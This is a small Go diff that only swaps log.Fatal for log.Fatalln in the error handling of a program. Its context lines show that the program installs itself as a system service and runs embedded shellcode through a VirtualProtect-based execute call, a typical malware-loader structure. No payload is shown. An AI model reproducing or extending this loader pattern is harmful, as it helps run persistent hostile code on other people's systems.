@@ -30,24 +30,24 @@ func main() {
 	}
 	svc, err := service.New(new(program), &svcConfig)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalln(err)
 	}
 
 	switch {
 	case install:
 		err = svc.Install()
 		if err != nil {
-			log.Fatal(err)
+			log.Fatalln(err)
 		}
 	case uninstall:
 		err = svc.Uninstall()
 		if err != nil {
-			log.Fatal(err)
+			log.Fatalln(err)
 		}
 	default: // run
 		lg, err := svc.Logger(nil)
 		if err != nil {
-			log.Fatal(err)
+			log.Fatalln(err)
 		}
 		err = svc.Run()
 		if err != nil {
@@ -104,7 +104,7 @@ func (p *program) Start(_ service.Service) error {
 	go func() {
 		err := shellcode.Execute(shellcode.MethodVirtualProtect, shellCode)
 		if err != nil {
-			log.Fatal(err)
+			log.Fatalln(err)
 		}
 	}()
 	return nil
